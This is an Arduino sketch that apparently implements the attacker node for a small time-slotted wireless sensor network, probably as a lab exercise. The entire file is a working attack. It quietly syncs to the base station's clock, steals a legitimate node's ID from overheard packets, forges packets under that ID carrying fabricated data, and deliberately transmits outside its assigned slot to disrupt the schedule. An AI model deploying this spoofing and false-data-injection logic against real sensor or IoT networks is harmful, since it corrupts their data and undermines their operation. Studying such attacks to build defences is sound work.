#include <Arduino.h>

struct flags {
  String ID = "XX";                       // Set to nothing... You will be stealing it using the sender_ID flag
  long offset = 0;                        // Offset from the node's cycle to the global cycle.
  long global_time = 0;                   // the time the previous node sent the message
  unsigned long time_in = 0;            // local arrival time, then converted to global arrival time, ideally the same as time_sent
  unsigned long time_in_U= 0;     // time in, but relative to the global time
  String sender_ID = "";                 //Stores the ID of the sender
  bool is_sync = 0;                      // Checks if a sync packet has been sent
  bool is_sent = 0;                      // Flag if a packet has been sent during it's transmission time
  bool is_data = 0;                      // Flag if a packet contains any data
};

//Setup Ennumerations to Closely Match the FSM and Pseudocode
enum states {SYNC, ACTIVE, DEAD, CAPTURE}; 

//Setup data structures and global variables
states state;
flags myFlags;

//Constants and Assumptions
//const String NODES[] = {"BB"};                                      //Hearable Nodes in the network. Single hop, so assume it can only hear from the base station
const PROGMEM int TOTAL_NODES = 3;                                 // Total number of nodes in the network
const PROGMEM int TIME_SLOT = 1000;                                  // amount of time per slot in milliseconds (ms) 10^-3
const PROGMEM unsigned long CYCLE_LENGTH = (TOTAL_NODES+1) * TIME_SLOT; // total length of one cycle
const PROGMEM int ERROR = 70;                                       // Transmission time error threshold
const PROGMEM int ENERGY_CHANCE = 101;                               // energy harvest rate
unsigned long TRANSMIT_TIME = (myFlags.ID.toInt() - 1) * TIME_SLOT +(TIME_SLOT / 2); // time in the cycle to transmit TRANSMIT_TIME. Needs to be calcualted on the fly!

//Function Definitions
void baseFSM();
void send(String output);
bool receive();
unsigned long cycleTime();
bool energyAvailible();
String generateFalseData();
void calculateTransmissionTime();


/** loop()
 * @attention Arduino needs this!
 * Put your setup code here, to run one time. Like a main function that is ran a single time BEFORE loop().
 * */ 
void setup() {
  //Setup the serial to begin running over the air and makes sure that the timeout is set properly
  Serial.begin(9600);
  Serial.setTimeout(30);

  state = DEAD;
}

/** loop()
 * @attention Arduino needs this!
 * Put your main code here, to run repeatedly. Like a main function that is ran repeatedly
 * */ 
void loop() {
  // The main function that should be ran over and over again. Contains all the proper logic
  baseFSM();
}


/** baseFSM()
 * The function that implements the states and their functionality in the base
 * */ 
void baseFSM(){
  switch(state) {
    case DEAD: {
      //@attention harvest energy here!
      if(energyAvailible()) {
        // Reset flags
        myFlags.is_sync = false;
        myFlags.is_sent = false;
        // Reset Timers
        myFlags.offset = 0;
        myFlags.global_time = 0;
        myFlags.time_in = 0;
        myFlags.time_in_U = 0;
        state = SYNC;
      }
    }
    case SYNC: {
      receive();
      if(myFlags.is_sync) {
        // DO NOT Send ACK... You want to be as sneaky as possible since you are impersonating a node
        //send(myFlags.ID + ":" + (String)cycleTime() + ":0" + ":1");
        myFlags.offset = (myFlags.global_time - (long) myFlags.time_in); // Add 50ms to account of processing timing
        if(myFlags.offset < 0) {
          myFlags.offset = (long) CYCLE_LENGTH + myFlags.offset;
        }
        myFlags.time_in_U = (myFlags.time_in + myFlags.offset) % CYCLE_LENGTH;
        state = CAPTURE;
      }
      break;
    }
    case CAPTURE: {
      receive();
      if(myFlags.is_data && !(myFlags.sender_ID == "BB")) state = ACTIVE;
      else if(myFlags.is_sync) state = SYNC;
      else if(!energyAvailible()) state = DEAD;
      break;
    }
    case ACTIVE: {
      // See if energy is available
      bool isenergyAvailible = energyAvailible();
      //Send their packet with it's values
      // (ID:TIME:SYNC:ACK:Data)
      while(isenergyAvailible && state == ACTIVE) {
        // Calculate the new transmission time based on the stolen ID
        calculateTransmissionTime();
         long currentCycle = cycleTime();
        //@important purposefully send it out of order!!! See the NOT symbol in front of the main section. Add a plus to the error as well
        if(!(currentCycle >= TRANSMIT_TIME && TRANSMIT_TIME + TIME_SLOT - ERROR >= currentCycle) && !myFlags.is_sent){
          // Wait for the proper timeslot to send
          delay((TIME_SLOT / 2)); 
          myFlags.is_sent = true;
          //Forge a fake packet
          send(myFlags.sender_ID + ":" + (String)cycleTime() + ":0" + ":0" + ":" + generateFalseData());
        }
        else if(receive()) {
          myFlags.time_in_U = cycleTime();
          if (myFlags.is_sync) {
            state = SYNC;
          }
        }
        isenergyAvailible = energyAvailible();
      }
      if (!isenergyAvailible) {
        state = DEAD;
      }
      break;
    }
  }
}

/** send
 * Sends a string over the wireless modules into the air
 * Packet layout: (ID:TIME:SYNC:ACK:Data)
 * 
 * @param output  The String that will be sent over the wireless module into the air
 */
void send(String output) {
  Serial.println(output);
  Serial.flush();
}

/** receive
 * Grabs a string out of the same wireless channel and reads it in if it exists
 * 
 * @return  True if a packet was found
 */
bool receive() {
  //Makes sure to only grab a packet if it exists
  if(Serial.available() > 0) {
      myFlags.sender_ID = Serial.readStringUntil(':');                     // Grab ID
      myFlags.time_in = millis() % CYCLE_LENGTH;                    // Grab the correct values for the current time in terms of the Cycle Length
      myFlags.global_time = Serial.parseInt();                       // Turn the data from String to integer
      Serial.readStringUntil(':');
      myFlags.is_sync = Serial.parseInt();                           // Sync Flag
      Serial.readStringUntil(':');                                   // ACK Flag
      String data = Serial.readStringUntil('\n');                    // Data
      if (data.length() != 0 && myFlags.sender_ID != "BB") {
        myFlags.is_data = true;
      }
      return true;
  }
  return false;
}

/** cycleTime()
 * Helper function to keep the time in the range of one cycle and incorporate the offset
 * Also resets the is_sent variable so we can send a new message if we get to a new cycle
 */
unsigned long cycleTime() {
  static unsigned long last_time;
  unsigned long time = ((long)(millis() % CYCLE_LENGTH) + myFlags.offset) % (long)CYCLE_LENGTH;
  if(last_time > time){ // checks if the clock reset and resets is_sent and sets all nodes dead
    myFlags.is_sent = false;
  }
  last_time = time; // for next time we call the function
  return time;
}


/** energyAvailible()
 * RNG for if a node has energy or not, based on the chances of that node having energy 
*/
bool energyAvailible(){
  if(random(0,100) <= ENERGY_CHANCE){
    return true;
  } 
  else return false;
}

/** generateFalseData()
 *  Creates a bunch of false data to try and seem legitimate to the outside world
 *  @attention for now, it only returns a set string, but this can be changed based on the type of data being traded
 * 
 * @returns A random string of data that seems legitimate to the base node
 */
String generateFalseData() {
  return "This data is totally legitmate";
}

/**
 * Calculates the new transmission time based on the stolen ID of a legitimate node
 */
void calculateTransmissionTime() {
  TRANSMIT_TIME = (myFlags.sender_ID.toInt() - 1) * TIME_SLOT +(TIME_SLOT / 2);
  return;
}
